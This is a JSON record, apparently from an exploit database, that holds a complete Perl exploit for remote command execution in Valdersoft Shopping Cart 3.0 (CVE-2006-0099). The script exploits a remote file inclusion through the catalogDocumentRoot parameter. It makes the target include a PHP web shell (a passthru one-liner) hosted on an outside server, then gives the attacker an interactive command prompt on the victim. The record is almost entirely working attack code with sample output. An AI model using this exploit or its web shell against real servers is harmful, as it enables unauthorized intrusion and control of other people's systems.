{
  "id": "1401",
  "title": "Valdersoft Shopping Cart 3.0 - Remote Command Execution",
  "cve": "CVE-2006-0099",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# cijfer-vscxpl - Valdersoft Shopping Cart <=3.0 Remote Command Execution Exploit\r\n#\r\n# Copyright (c) 2005 cijfer <cijfer@netti.fi>\r\n# All rights reserved.           \r\n#\r\n## 1. example\r\n#\r\n# [cijfer@kalma:/research]$ ./cijfer-vscxpl.pl -h www.valdersoft.com -d /store\r\n# [cijfer@www.valdersoft.com /]$ id;uname -a\r\n# uid=2526(apache) gid=2524(apache) groups=2524(apache), 10004(psaserv)\r\n# FreeBSD valdersoft.com 4.9-RELEASE FreeBSD 4.9-RELEASE #0: Wed Nov 19 00:35:22 EST 2003     \r\n# tim@temp.atlnetworks.com:/usr/src/sys/compile/PLESK  i386\r\n# \r\n# [cijfer@www.valdersoft.com /]$ \r\n#\r\n## 2. explanation\r\n#\r\n# various files within 'include\\templates\\categories' contains unsanitized and undefined\r\n# variables which can allow remote file inclusion, leading to remote command execution.\r\n# this can be done by entering a remote url within the 'catalogDocumentRoot' variable.\r\n#\r\n## 3. the bug\r\n#\r\n# this is obvious _why_ it is dangerous.\r\n#\r\n#       ...\r\n#       include($catalogDocumentRoot.$catalogDir.\"include/modules/categories_path.php\");\r\n#       ...\r\n#\r\n## 4. the php shell\r\n#\r\n# this exploit grabs data via regular expression strings. foreign php shell\r\n# scripts will not work with this exploit. use the following code along with\r\n# this exploit and put it in 'cmd.txt' or whatever you please:\r\n#\r\n#       <?passthru($_GET[cmd]);?>\r\n#\r\n##\r\n#\r\n# $Id: cijfer-vscxpl.pl,v 0.2 2005/12/30 11:44:00 cijfer Exp cijfer $\r\n\r\nuse Getopt::Std;\r\nuse IO::Socket;\r\nuse URI::Escape;\r\n\r\ngetopts(\"h:d:\");\r\n\r\n$host = $opt_h;\r\n$dirs = $opt_d;\r\n$shel = \"http://site.com/cmd.txt\";       # cmd shell url\r\n$cmdv = \"cmd\";                           # cmd variable (ex. passthru($_GET[cmd]);)\r\n$good = 0;\r\n\r\nif(!$host||!$dirs)\r\n{\r\n        print \"cijfer-vscxpl.pl by cijfer\\n\";\r\n        print \"usage: $0 -h cijfer.xxx -d /valdersoft\\r\\n\";\r\n        print \"usage: $0 -h <hostname> -d <directory>\\r\\n\";\r\n        exit();\r\n}\r\n\r\nwhile()\r\n{\r\n        print \"[cijfer@\".$host.\" /]\\$ \";\r\n        while(<STDIN>)\r\n        {\r\n                $cmds=$_;\r\n                chomp($cmds);\r\n                last;\r\n        }\r\n\r\n        $string  = $dirs;\r\n        $string .= \"/include/templates/categories/default.php?\";\r\n        $string .= uri_escape($cmdv);\r\n        $string .= \"=\";\r\n        $string .= \"%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B\";\r\n        $string .= uri_escape($cmds).\";echo\";\r\n        $string .= \"%3B%65%63%68%6F%20%5F%45%4E%44%5F;echo;\";\r\n        $string .= \"&catalogDocumentRoot=\";\r\n        $string .= $shel;\r\n        $string .= \"?\";\r\n\r\n        $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"error: connect()\\n\";\r\n\r\n        print $sock \"GET $string HTTP/1.1\\n\";\r\n        print $sock \"Host: $host\\n\";\r\n        print $sock \"Accept: */*\\n\";\r\n        print $sock \"Connection: close\\n\\n\";\r\n\r\n        while($result = <$sock>)\r\n        {\r\n                if($result =~ /^_END_/)\r\n                {\r\n                        $good=0;\r\n                }\r\n\r\n                if($good==1)\r\n                {\r\n                        print $result;\r\n                }\r\n\r\n                if($result =~ /^_START_/)\r\n                {\r\n                        $good=1;\r\n                }\r\n        }\r\n}\r\n\r\n# milw0rm.com [2006-01-03]",
  "url": "https://www.exploit-db.com/exploits/1401"
}